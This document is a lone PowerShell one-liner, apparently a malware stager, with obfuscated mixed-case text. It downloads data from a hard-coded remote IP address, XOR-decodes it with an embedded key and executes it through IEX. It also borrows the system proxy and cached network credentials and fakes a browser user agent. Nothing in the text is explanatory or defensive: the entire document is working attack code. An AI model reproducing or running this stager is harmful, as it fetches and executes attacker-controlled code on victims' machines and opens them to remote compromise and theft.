
[SYsTEM.NeT.SErViCePOINTMANageR]::EXpeCT100CONtinUE = 0;$WC=NEW-ObjeCt SyStEm.NET.WebClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDeRs.AdD('User-Agent',$u);$wC.ProXy = [SYsTEM.NeT.WEbREQUEst]::DEfaULTWEbProXy;$wc.PrOXY.CredENtIaLs = [SyStEm.NEt.CrEDEnTIALCACHE]::DEfAUlTNETWOrkCREdENTIALs;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[char[]]$B=([chaR[]]($wc.DOwnloADStrInG("http://138.121.170.12:3133/index.asp")))|%{$_-bXor$k[$I++%$K.LeNgth]};IEX ($b-jOIn'')

